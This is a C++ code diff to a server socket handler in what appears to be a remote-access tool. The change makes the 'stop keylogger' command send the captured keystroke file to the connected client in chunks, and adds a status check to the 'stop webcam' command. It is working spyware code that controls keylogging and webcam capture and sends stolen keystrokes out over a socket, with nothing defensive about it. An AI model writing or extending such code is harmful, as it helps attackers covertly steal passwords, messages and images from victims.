@@ -148,16 +148,39 @@ void ServerSocket::ProcessClientMessage() {
 		result = "Y";
 	}
 	else if (query == 24) {
-		isKeyloggerOn = false;
-		result = "Y";
+		if (!isKeyloggerOn) result = "N";
+		else {
+			fstream file("_Data/keylogger.txt", ios::binary | ios::in);
+			isKeyloggerOn = false;
+			file.seekg(0, ios::end);
+			size_t fileSize = file.tellg();
+			file.seekg(0, ios::beg);
+			result = "F" + to_string(fileSize);
+			Send();
+			char fileBuffer[maxBufferSize];
+			while (fileSize > 0 && fileSize >= maxBufferSize) {
+				file.read(buffer, maxBufferSize);
+				send(clientSocket, buffer, maxBufferSize, 0);
+				fileSize -= maxBufferSize;
+			}
+			if (fileSize > 0) {
+				file.read(buffer, fileSize);
+				send(clientSocket, buffer, fileSize, 0);
+			}
+			file.close();
+			sent = true;
+		}
 	}
 	else if (query == 26) {
 		isWebcamOn = true;
 		result = "Y";
 	}
 	else if (query == 27) {
-		isWebcamOn = false;
-		result = "Y";
+		if (!isWebcamOn) result = "N";
+		else {
+			isWebcamOn = false;
+			result = "Y";
+		}
 	}
 	
 	if (sent) return;
